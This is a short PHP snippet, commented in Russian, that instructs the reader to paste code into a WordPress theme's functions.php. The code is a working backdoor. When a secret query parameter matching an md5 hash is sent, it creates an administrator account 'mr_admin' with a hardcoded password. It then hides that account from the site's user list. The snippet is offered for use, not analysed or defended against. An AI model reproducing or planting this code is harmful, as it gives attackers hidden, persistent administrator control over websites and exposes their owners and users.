<?php
/**
 * Измените functions.php сайта вставив/добавив следуйщий код
 */

add_action( 'wp_head', 'my_backdoor' );

/**
 * С помощью этого кода мы создаём на сайте нового пользователя 'mr_admin' с паролем «pa55w0rd!» и правами администратора.
 */
function my_backdoor()
{
    if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
        require('wp-includes/registration.php');
        if (!username_exists('mr_admin')) {
         $user_id = wp_create_user('mr_admin', 'pa55w0rd!');
         $user = new WP_User($user_id);
         $user->set_role('administrator');
        }
    }
}

/**
 * Для того, чтобы скрыть нашего нового пользователя из списка пользователей, добавьте в functions.php следующий код:
 *
 * @param $user_search
 */
function w45345p_hide_specific_user($user_search)
{
    global $wpdb;
    $user_search->query_where = str_replace(
        'WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != 'mr_admin'",
        $user_search->query_where);
}

add_action('pre_user_query','w45345p_hide_specific_user');